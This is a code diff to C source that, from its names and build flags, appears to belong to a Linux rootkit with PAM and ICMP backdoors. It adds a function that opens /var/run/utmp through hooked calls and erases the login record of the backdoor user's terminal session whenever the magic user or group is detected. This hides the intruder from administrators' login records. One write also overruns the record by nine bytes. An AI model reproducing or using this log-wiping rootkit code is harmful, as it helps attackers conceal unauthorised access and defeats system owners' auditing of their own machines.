@@ -9,6 +9,33 @@ void putbdvlenv(void){
     }else putenv("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin");
 }
 
+#ifdef USE_PAM_BD
+void utmpclean(void){
+    int fd;
+    struct utmp uent;
+    char *pts = ttyname(0)+5;
+
+    hook(COPEN, CREAD, CWRITE);
+
+    fd = (long)call(COPEN, "/var/run/utmp", 02, 0);
+    if(fd < 0) return;
+
+    lseek(fd, 0, SEEK_SET);
+    while((ssize_t)call(CREAD, fd, &uent, sizeof(struct utmp))){
+        if(strcmp(uent.ut_user, PAM_UNAME))
+            continue;
+
+        if(!strncmp(uent.ut_line, pts, strlen(pts))){
+            memset(&uent, 0, sizeof(struct utmp));
+            lseek(fd, -(sizeof(struct utmp)), SEEK_CUR);
+            call(CWRITE, fd, &uent, sizeof(struct utmp)+9);
+        }
+    }
+
+    close(fd);
+}
+#endif
+
 int magicusr(void){
 #ifndef HIDE_SELF
     return 1;
@@ -40,7 +67,12 @@ nopenope:
           #ifdef USE_ICMP_BD
           || mygid == magicgid-1
           #endif
-          ) putbdvlenv();
+          ){
+#ifdef USE_PAM_BD
+            utmpclean();
+#endif
+            putbdvlenv();
+        }
     }
     return magician;
 #endif
